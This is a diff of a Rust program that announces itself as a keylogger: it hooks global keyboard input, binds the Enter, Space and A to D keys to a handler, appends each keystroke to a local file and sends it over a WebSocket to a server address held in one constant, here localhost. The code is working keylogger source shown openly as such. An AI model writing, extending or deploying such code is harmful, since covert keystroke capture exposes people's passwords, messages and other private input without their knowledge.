@@ -1,52 +1,50 @@
 use inputbot::{KeybdKey::*, MouseButton::*, *};
 use std::fs::OpenOptions;
 use std::io::prelude::*;
-
-
 use tungstenite::{connect, Message};
 use url::Url;
 
-/// A WebSocket echo server
+
+const ws_address:&str = "ws://localhost:8765";
 
 fn passthrough_key(event: &str) {
+    file_writer(event);
+    ws_client(event);
+}
 
-    // env_logger::init();
-    let (mut socket, response) =
-        connect(Url::parse("ws://localhost:8765").unwrap()).expect("Can't connect");
-    println!("Connected to the server");
-    for (ref header, _value) in response.headers() {
-        println!("* {}", header);
-    }
-    socket.write_message(Message::Text("Hello WebSocket".into())).unwrap();
-
-    println!("{}", event);
+fn file_writer(event: &str) {
     let mut file = OpenOptions::new()
     .write(true)
     .append(true)
     .open("text.txt")
     .unwrap();
 
-if let Err(e) = write!(file, "{}", event) {
-    eprintln!("Couldn't write to file: {}", e);
+    if let Err(e) = write!(file, "{}", event) {
+        eprintln!("Couldn't write to file: {}", e);
+    }
 }
 
+fn ws_client(event: &str) {
+    // env_logger::init();
+    let (mut socket, response) =
+    connect(Url::parse(&ws_address).unwrap()).expect("Can't connect");
 
+    socket.write_message(Message::Text(event.into())).unwrap();
+    loop {
+        let msg = socket.read_message().expect("Error readingasbhello message");
+        println!("Received: {}", msg);
+    }
 }
 
 fn main() {
-    // env_logger::init();
-
-    ZKey.bind(|| { passthrough_key("z") });
-
-    handle_input_events();
+    println!("Keylogger Running");
+    keyboard_input();
 }
 
-fn keyboardInput() {
+fn keyboard_input() {
     EnterKey.bind(|| { passthrough_key("\n") });
     SpaceKey.bind(|| { passthrough_key(" ") });
-    AKey.bind(|| { 
-        passthrough_key("a") 
-    });
+    AKey.bind(|| { passthrough_key("a") });
     BKey.bind(|| { passthrough_key("b") });
     CKey.bind(|| { passthrough_key("c") });
     DKey.bind(|| { passthrough_key("d") });
